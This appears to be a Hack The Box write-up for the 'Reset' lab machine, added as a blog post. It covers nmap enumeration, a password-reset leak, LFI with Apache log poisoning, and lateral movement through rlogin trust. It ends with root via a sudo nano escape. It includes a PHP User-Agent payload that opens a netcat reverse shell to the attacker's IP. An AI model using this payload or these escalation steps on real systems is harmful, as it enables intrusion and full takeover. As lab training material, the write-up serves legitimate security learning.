@@ -1,0 +1,180 @@
+---
+title: Reset Writeup - Hack The Box
+description: Exploiting log poisoning and Rservices for initial access, then abusing a tmux session and nano sudo permissions for privilege escalation
+author: Nontas Bakoulas
+date: 2025-10-12
+category: HTB Machines
+reading_time: 15
+---
+
+## Enumeration
+Let's start with an `nmap` scan:
+```console title="Nmap scan"
+nontas@local$ ports=$(nmap --open 10.129.234.130| grep open| cut -d ' ' -f 1|cut -d '/' -f 1|paste -sd,)
+nontas@local$ nmap -sVC -p $ports 10.129.234.130 -Pn --disable-arp-ping
+Starting Nmap 7.93 ( https://nmap.org ) at 2025-10-11 21:03 EEST
+Stats: 0:00:17 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 80.00% done; ETC: 21:03 (0:00:04 remaining)
+Stats: 0:00:48 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 99.57% done; ETC: 21:04 (0:00:00 remaining)
+Nmap scan report for 10.129.234.130
+Host is up (0.086s latency).
+
+PORT    STATE SERVICE VERSION
+22/tcp  open  ssh     OpenSSH 8.9p1 Ubuntu 3
+ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 6a161fc8fefde398a685cffe7b0e60aa (ECDSA)
+|_  256 e408cc5f8e56258f38c3ecdfb8860c69 (ED25519)
+80/tcp  open  http    Apache httpd 2.4.52 ((Ubuntu))
+|_http-title: Admin Login
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+512/tcp open  exec    netkit-rsh rexecd
+513/tcp open  login?
+514/tcp open  shell   Netkit rshd
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 50.88 seconds
+```
+
+The web app shows a login form: ![Login form](/images/blog/reset/IMG-20251012103215946.png)
+
+We can also reset our password. If we submit a wrong name, we get "User not found": ![User not found](/images/blog/reset/IMG-20251012103339998.png)
+
+The username `admin` exists, and we get the new password as a response in the HTTP request: ![Password reset](/images/blog/reset/IMG-20251012103449779.png)
+
+We can use these credentials to log into the dashboard, and are presented with 2 options: `syslog` and `auth.log`. For both options when you click "View Logs", no contents show up: ![Dashboard](/images/blog/reset/IMG-20251012110439746.png)
+
+### Log Poisoning
+The `POST` request being made has the `file` parameter that specifies the absolute path `/var/log/syslog`: ![POST request](/images/blog/reset/IMG-20251012111459876.png)
+
+In this case, we should test for command injection and LFI.
+
+The parameter is vulnerable to LFI, since we can read log files such as `/var/log/apache2/access.log`: ![Access log](/images/blog/reset/IMG-20251012112204230.png)
+
+As we can see, the `User-Agent` is included in the log file, so we can perform log poisoning.
+
+![User agent](/images/blog/reset/IMG-20251012112128336.png)
+
+Modify the `User-Agent` to the following:
+```php
+<?php system('rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.78 1234 >/tmp/f'); ?>
+```
+
+And make a new request to get a reverse shell connection:
+```console title="Reverse shell"
+nontas@local$ nc -lnvp 1234
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::1234
+Ncat: Listening on 0.0.0.0:1234
+Ncat: Connection from 10.129.234.130.
+Ncat: Connection from 10.129.234.130:42630.
+/bin/sh: 0: can't access tty; job control turned off
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+www-data@reset:/var/www/html$ ^Z
+[1]  + 2175 suspended  nc -lnvp 1234
+nontas@local$ stty raw -echo;fg
+[1]  + 2175 continued  nc -lnvp 1234
+
+www-data@reset:/var/www/html$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data),4(adm)
+```
+
+Now we can get the user flag:
+```console
+www-data@reset:/var/www/html$ cat /home/sadm/user.txt
+```
+
+## Lateral Movement
+The `nmap` scan showed the `Rservices` (`rsh`, `rlogin`, `rcp`) running on ports 512,513 and 514. These are older remote login protocols that predate SSH.
+
+A quick scan with `LinEnum.sh` shows the following (or via `cat /etc/hosts.equiv`):
+```txt
+[+] Hosts.equiv file and contents:
+-rw-r--r-- 1 root root 139 Dec  6  2024 /etc/hosts.equiv
+# /etc/hosts.equiv: list  of  hosts  and  users  that are granted "trusted" r
+#                   command access to your system .
+- root
+- local
++ sadm
+```
+
+The user `sadm` can access the machine via `rsh`, `rlogin` and `rcp` **without a password**.
+
+First, create the user `sadm` on your local machine, switch to that user, and login to the remote via `rlogin`:
+```console title="Remote login"
+nontas@local$ sudo useradd sadm
+[Oct 12, 2025 - 12:23:19 (EEST)] nontas@local$ sudo passwd sadm
+New password:
+Retype new password:
+passwd: password updated successfully
+nontas@local$ su sadm
+$ id
+uid=1000(sadm) gid=1001(sadm) groups=1001(sadm)
+$ rlogin 10.129.234.130
+<SNIP>
+sadm@reset:~$
+```
+
+## Privilege Escalation
+Let's enumerate the running processes (can also be seen from `LinEnum.sh` we ran before):
+```console
+sadm@reset:~$ ps aux
+<SNIP>
+sadm        1202  0.0  0.1   8636  3956 ?        Ss   Oct11   0:00 tmux new-session -d -s sadm_session
+<SNIP>
+```
+
+There's a `tmux` session running called `sadm_session`. Let's connect to it:
+```console
+sadm@reset:~$ tmux attach -t sadm_session
+```
+
+It displays the following:
+```console
+echo 7lE2PAfVHfjz4HpE | sudo -S nano /etc/firewall.sh
+sadm@reset:~$ echo 7lE2PAfVHfjz4HpE | sudo -S nano /etc/firewall.sh
+Too many errors from stdin
+sadm@reset:~$
+```
+
+The password of the `sadm` user is `7lE2PAfVHfjz4HpE`, and by running `sudo -l` we can see the commands they can run as sudo:
+```console title="Sudo privileges"
+sadm@reset:~$ sudo -l
+Matching Defaults entries for sadm on reset:
+    env_reset, timestamp_timeout=-1, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty,
+    !syslog
+
+User sadm may run the following commands on reset:
+    (ALL) PASSWD: /usr/bin/nano /etc/firewall.sh
+    (ALL) PASSWD: /usr/bin/tail /var/log/syslog
+    (ALL) PASSWD: /usr/bin/tail /var/log/auth.log
+```
+
+The `sadm` user can use `nano` with the file `/etc/firewall.sh`:
+```console
+sadm@reset:~$ sudo nano /etc/firewall.sh
+```
+
+From [this](https://gtfobins.github.io/gtfobins/nano/) page, we can see the following steps to spawn an interactive shell (as root):
+```txt
+^R^X
+reset; bash 1>&0 2>&0
+```
+
+So first we press `CTRL+R`, then `CTRL+X` and we input the above command (`sh` or `bash` doesn't matter): ![Nano exploit](/images/blog/reset/IMG-20251012135805691.png)
+
+And we're now `root`:
+```console title="Root access"
+root@reset:/home/sadm# cd /root
+root@reset:~# ls
+root_279e22f8.txt  snap
+root@reset:~# cat root_279e22f8.txt
+```
+
+We have successfully completed **Reset**!
